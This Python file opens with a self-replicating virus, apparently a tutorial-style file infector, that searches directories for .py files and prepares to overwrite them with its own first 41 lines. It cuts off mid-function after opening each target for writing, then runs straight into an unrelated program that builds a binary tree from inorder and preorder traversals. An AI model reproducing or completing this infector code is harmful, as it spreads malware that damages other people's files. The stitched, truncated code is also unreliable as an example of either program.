#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program to construct a tree using
# inorder and preorder traversal
class TreeNode:
     
    def __init__(self, x):     
        self.val = x
        self.left = None
        self.right = None
 
s = set()
st = []
 
# Function to build tree using given traversal
def buildTree(preorder, inorder, n):
    root = None;
     
    pre = 0
    in_t = 0
     
    while pre < n:
        node = None;
         
        while True:   
            node = TreeNode(preorder[pre])
             
            if (root == None):           
                root = node;
              
            if (len(st) > 0):       
                if (st[-1] in s):               
                    s.discard(st[-1]);
                    st[-1].right = node;
                    st.pop();
             
                else:               
                    st[-1].left = node;
                         
            st.append(node);
             
            if pre>=n or preorder[pre] == inorder[in_t]:
                pre += 1
                break
            pre += 1
             
        node = None;
         
        while (len(st) > 0 and in_t < n and st[-1].val == inorder[in_t]):       
            node = st[-1];
            st.pop();
            in_t += 1
     
 
        if (node != None):       
            s.add(node);
            st.append(node);
 
    return root;
 
# Function to print tree in_t Inorder
def printInorder( node):
 
    if (node == None):
        return;
 
    ''' first recur on left child '''
    printInorder(node.left);
 
    ''' then print data of node '''
    print(node.val, end=" ");
 
    ''' now recur on right child '''
    printInorder(node.right);
 
# Driver code
if __name__=='__main__':
     
    in_t = [ 9, 8, 4, 2, 10, 5, 10, 1, 6, 3, 13, 12, 7 ]
    pre = [ 1, 2, 4, 8, 9, 5, 10, 10, 3, 6, 7, 12, 13 ]
    l = len(in_t)
 
    root = buildTree(pre, in_t, l);
 
    printInorder(root);
     
    # This code is contributed by rutvik_56.